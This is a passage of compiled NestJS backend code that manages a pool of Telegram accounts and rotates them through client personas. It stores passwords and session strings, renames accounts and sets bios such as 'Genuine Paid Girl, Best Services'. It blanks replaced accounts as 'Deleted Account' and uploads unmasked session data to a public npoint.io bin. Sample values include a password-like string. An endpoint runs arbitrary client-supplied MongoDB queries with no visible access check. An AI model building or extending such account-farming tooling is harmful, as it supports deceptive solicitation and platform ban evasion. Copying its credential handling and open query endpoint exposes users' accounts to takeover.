    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'The user data has been successfully updated.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_client_dto_1.UpdateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'The user data has been successfully deleted.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Query executed successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid query.' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "executeQuery", null);
__decorate([
    (0, common_1.Patch)(':clientId/promoteMobile/add'),
    (0, swagger_1.ApiOperation)({ summary: 'Add a mobile number to the promoteMobile array for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Mobile number added successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Client not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)('mobileNumber')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "addPromoteMobile", null);
__decorate([
    (0, common_1.Patch)(':clientId/promoteMobile/remove'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Mobile number removed successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Client not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)('mobileNumber')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "removePromoteMobile", null);
exports.ClientController = ClientController = __decorate([
    (0, swagger_1.ApiTags)('Clients'),
    (0, common_1.Controller)('clients'),
    __metadata("design:paramtypes", [client_service_1.ClientService])
], ClientController);


/***/ }),

/***/ "./src/components/clients/client.module.ts":
/*!*************************************************!*\
  !*** ./src/components/clients/client.module.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
const client_controller_1 = __webpack_require__(/*! ./client.controller */ "./src/components/clients/client.controller.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const archived_client_module_1 = __webpack_require__(/*! ../archived-clients/archived-client.module */ "./src/components/archived-clients/archived-client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
let ClientModule = class ClientModule {
};
exports.ClientModule = ClientModule;
exports.ClientModule = ClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: client_schema_1.Client.name, schema: client_schema_1.ClientSchema }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => archived_client_module_1.ArchivedClientModule),
            npoint_module_1.NpointModule
        ],
        controllers: [client_controller_1.ClientController],
        providers: [client_service_1.ClientService],
        exports: [client_service_1.ClientService]
    })
], ClientModule);


/***/ }),

/***/ "./src/components/clients/client.service.ts":
/*!**************************************************!*\
  !*** ./src/components/clients/client.service.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientService = void 0;
const Telegram_service_1 = __webpack_require__(/*! ./../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const archived_client_service_1 = __webpack_require__(/*! ../archived-clients/archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
const path = __importStar(__webpack_require__(/*! path */ "path"));
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
let settingupClient = Date.now() - 250000;
let ClientService = class ClientService {
    constructor(clientModel, telegramService, bufferClientService, usersService, archivedClientService, npointSerive) {
        this.clientModel = clientModel;
        this.telegramService = telegramService;
        this.bufferClientService = bufferClientService;
        this.usersService = usersService;
        this.archivedClientService = archivedClientService;
        this.npointSerive = npointSerive;
        this.clientsMap = new Map();
        setInterval(async () => {
            await this.refreshMap();
        }, 5 * 60 * 1000);
    }
    async checkNpoint() {
        const clients = (await axios_1.default.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;
        for (const client in clients) {
            const existingClient = await this.findOne(client, false);
            if ((0, utils_1.areJsonsNotSame)(existingClient, clients[client])) {
                await this.findAll();
                const clientData = (0, utils_1.mapToJson)(this.clientsMap);
                await this.npointSerive.updateDocument("7c2682f37bb93ef486ba", clientData);
                const maskedCls = {};
                for (const client in clientData) {
                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];
                    maskedCls[client] = maskedClient;
                }
                await this.npointSerive.updateDocument("f0d1e44d82893490bbde", maskedCls);
                break;
            }
        }
    }
    async create(createClientDto) {
        const createdUser = new this.clientModel(createClientDto);
        return createdUser.save();
    }
    async findAll() {
        const clientMapLength = this.clientsMap.size;
        if (clientMapLength < 20) {
            const results = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean();
            for (const client of results) {
                this.clientsMap.set(client.clientId, client);
            }
            console.log("Refreshed Clients");
            return results;
        }
        else {
            return Array.from(this.clientsMap.values());
        }
    }
    async findAllMasked(query) {
        const allClients = await this.findAll();
        const filteredClients = query
            ? allClients.filter(client => {
                return Object.keys(query).every(key => client[key] === query[key]);
            })
            : allClients;
        const results = filteredClients.map(client => {
            const { session, mobile, password, promoteMobile, ...maskedClient } = client;
            return maskedClient;
        });
        return results;
    }
    async refreshMap() {
        console.log("Refreshed Clients");
        this.clientsMap.clear();
    }
    async findOne(clientId, throwErr = true) {
        const client = this.clientsMap.get(clientId);
        if (client) {
            return client;
        }
        else {
            const user = (await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).exec())?.toJSON();
            this.clientsMap.set(clientId, user);
            if (!user && throwErr) {
                throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
            }
            return user;
        }
    }
    async update(clientId, updateClientDto) {
        delete updateClientDto['_id'];
        if (updateClientDto._doc) {
            delete updateClientDto._doc['_id'];
        }
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Updating the Existing client: ${clientId}`);
        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
        }
        this.clientsMap.set(clientId, updatedUser);
        await (0, utils_1.fetchWithTimeout)(`${process.env.uptimeChecker}/refreshmap`);
        await (0, utils_1.fetchWithTimeout)(`${process.env.uptimebot}/refreshmap`);
        console.log("Refreshed Maps");
        return updatedUser;
    }
    async remove(clientId) {
        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();
        if (!deletedUser) {
            throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.clientModel.find(filter).exec();
    }
    async setupClient(clientId, setupClientQueryDto) {
        console.log(`Received New Client Request for - ${clientId}`);
        if ((0, utils_1.toBoolean)(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {
            settingupClient = Date.now();
            const existingClient = await this.findOne(clientId);
            const existingClientMobile = existingClient.mobile;
            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);
            console.log(setupClientQueryDto);
            await this.telegramService.disconnectAll();
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } };
            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];
            try {
                if (newBufferClient) {
                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile });
                    await this.telegramService.createClient(newBufferClient.mobile);
                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);
                    await this.telegramService.deleteClient(newBufferClient.mobile);
                    await this.updateClientSession(newSession);
                }
                else {
                    await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Buffer Clients not available`);
                    console.log("Buffer Clients not available");
                }
            }
            catch (error) {
                (0, utils_1.parseError)(error);
                await this.telegramService.deleteClient(newBufferClient.mobile);
                console.log("Removing buffer as error");
                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];
                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });
                this.telegramService.setActiveClientSetup(undefined);
            }
        }
        else {
            console.log("Profile Setup Recently tried, wait ::", settingupClient - Date.now());
        }
    }
    async updateClientSession(newSession) {
        try {
            const setup = this.telegramService.getActiveClientSetup();
            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;
            await this.telegramService.disconnectAll();
            await (0, Helpers_1.sleep)(2000);
            let updatedUsername;
            await this.telegramService.createClient(newMobile, false, true);
            const username = (clientId?.match(/[a-zA-Z]+/g)).toString();
            const userCaps = username[0].toUpperCase() + username.slice(1);
            let baseUsername = `${userCaps}_Red` + (0, utils_1.fetchNumbersFromString)(clientId);
            updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);
            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);
            await this.telegramService.deleteClient(newMobile);
            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];
            const existingClient = await this.findOne(clientId);
            this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });
            await (0, utils_1.fetchWithTimeout)(existingClient.deployKey, {}, 1);
            await this.bufferClientService.remove(newMobile);
            setTimeout(async () => {
                await this.updateClient(clientId);
            }, 10000);
            try {
                if (existingClientUser) {
                    try {
                        if ((0, utils_1.toBoolean)(formalities)) {
                            await this.telegramService.createClient(existingMobile, false, true);
                            console.log("Started Formalities");
                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);
                            await this.telegramService.deleteProfilePhotos(existingMobile);
                            await this.telegramService.updateUsername(existingMobile, '');
                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);
                            console.log("Formalities finished");
                            await this.telegramService.deleteClient(existingMobile);
                            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Formalities finished`);
                        }
                        else {
                            console.log("Formalities skipped");
                        }
                        if (archiveOld) {
                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];
                            const bufferClientDto = {
                                mobile: existingMobile,
                                availableDate,
                                session: existingClientUser.session,
                                tgId: existingClientUser.tgId,
                                channels: 170
                            };
                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);
                            console.log("client Archived: ", updatedBufferClient);
                            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Client Archived`);
                        }
                        else {
                            console.log("Client Archive Skipped");
                            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Client Archive Skipped`);
                        }
                    }
                    catch (error) {
                        console.log("Cannot Archive Old Client");
                        const errorDetails = (0, utils_1.parseError)(error);
                        if ((0, utils_1.contains)(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', "session_revoked", "user_deactivated_ban"])) {
                            console.log("Deleting User: ", existingClientUser.mobile);
                            await this.bufferClientService.remove(existingClientUser.mobile);
                            await this.archivedClientService.remove(existingClientUser.mobile);
                        }
                        else {
                            console.log('Not Deleting user');
                        }
                    }
                }
            }
            catch (error) {
                (0, utils_1.parseError)(error);
            }
            this.telegramService.setActiveClientSetup(undefined);
            console.log("Update finished Exitting Exiiting TG Service");
            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Update finished`);
            await this.telegramService.disconnectAll();
        }
        catch (e) {
            (0, utils_1.parseError)(e);
            this.telegramService.setActiveClientSetup(undefined);
        }
    }
    async updateClient(clientId) {
        const client = await this.findOne(clientId);
        try {
            await cloudinary_1.CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());
            const telegramClient = await this.telegramService.createClient(client.mobile, true, false);
            await (0, Helpers_1.sleep)(2000);
            const me = await telegramClient.getMe();
            if (me.username !== client.username || !me.username.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {
                const username = (clientId?.match(/[a-zA-Z]+/g)).toString();
                const userCaps = username[0].toUpperCase() + username.slice(1);
                let baseUsername = `${userCaps}_Red` + (0, utils_1.fetchNumbersFromString)(clientId);
                const updatedUsername = await telegramClient.updateUsername(baseUsername);
                await this.update(client.clientId, { username: updatedUsername });
            }
            await (0, Helpers_1.sleep)(2000);
            if (me.firstName !== client.name) {
                await telegramClient.updateProfile(client.name, "Genuine Paid Girl🥰, Best Services❤️");
            }
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.deleteProfilePhotos();
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updatePrivacy();
            await (0, Helpers_1.sleep)(3000);
            const rootPath = process.cwd();
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));
            await (0, Helpers_1.sleep)(2000);
            await this.telegramService.deleteClient(client.mobile);
        }
        catch (error) {
            (0, utils_1.parseError)(error);
        }
    }
    async updateClients() {
        const clients = await this.findAll();
        for (const client of clients) {
            await this.updateClient(client.clientId);
        }
    }
    async generateNewSession(phoneNumber, attempt = 1) {
        try {
            console.log("String Generation started");
            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=String Generation started for NewNumber:${phoneNumber}`);
            await (0, Helpers_1.sleep)(1000);
            const response = await (0, utils_1.fetchWithTimeout)(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);
            if (response) {
                console.log(`Code Sent successfully`, response.data);
                await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Code Sent successfully`);
                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] });
            }
            else {
                await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Failed to send Code`);
                console.log("Failed to send Code", response);
                if (attempt < 2) {
                    await (0, Helpers_1.sleep)(8000);
                    await this.generateNewSession(phoneNumber, attempt + 1);
                }
            }
        }
        catch (error) {
            console.log(error);
            if (attempt < 2) {
                await (0, Helpers_1.sleep)(8000);
                await this.generateNewSession(phoneNumber, attempt + 1);
            }
        }
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.clientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async addPromoteMobile(clientId, mobileNumber) {
        return this.clientModel.findOneAndUpdate({ clientId }, { $addToSet: { promoteMobile: mobileNumber } }, { new: true }).exec();
    }
    async removePromoteMobile(clientId, mobileNumber) {
        return this.clientModel.findOneAndUpdate({ clientId }, { $pull: { promoteMobile: mobileNumber } }, { new: true }).exec();
    }
};
exports.ClientService = ClientService;
exports.ClientService = ClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(client_schema_1.Client.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => archived_client_service_1.ArchivedClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        buffer_client_service_1.BufferClientService,
        users_service_1.UsersService,
        archived_client_service_1.ArchivedClientService,
        npoint_service_1.NpointService])
], ClientService);


/***/ }),

/***/ "./src/components/clients/dto/create-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/create-client.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateClientDto {
}
exports.CreateClientDto = CreateClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '+916265240911', description: 'Phone number of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] }),
    __metadata("design:type", Array)
], CreateClientDto.prototype, "promoteMobile", void 0);


/***/ }),

/***/ "./src/components/clients/dto/search-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/search-client.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchClientDto {
}
exports.SearchClientDto = SearchClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Client ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Database collection name' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Channel link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Name of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Phone number of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "number", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Password of the client' }),
